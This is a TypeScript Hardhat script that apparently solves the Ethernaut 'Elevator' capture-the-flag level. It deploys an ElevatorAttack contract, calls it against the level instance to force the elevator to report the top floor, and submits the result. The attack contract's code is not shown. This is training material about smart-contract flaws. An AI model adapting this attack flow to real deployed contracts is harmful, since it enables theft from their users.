import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { Elevator } from '../typechain-types/Elevator'
import { ElevatorAttack } from '../typechain-types/ElevatorAttack'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

const levelAddress = '0xaB4F3F2644060b2D960b0d88F0a42d1D27484687'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('Elevator', levelAddress, signer)) as Elevator
  const attackContract = (await loadOrDeployContract('ElevatorAttack', [], signer)) as ElevatorAttack

  console.log('Is on last floor?: ', await targetContract.top())

  const attackTx = await attackContract.attack(targetContract.address)
  console.log('Attack tx id: ', attackTx.hash)
  await attackTx.wait()

  console.log('Is on last floor?: ', await targetContract.top())

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
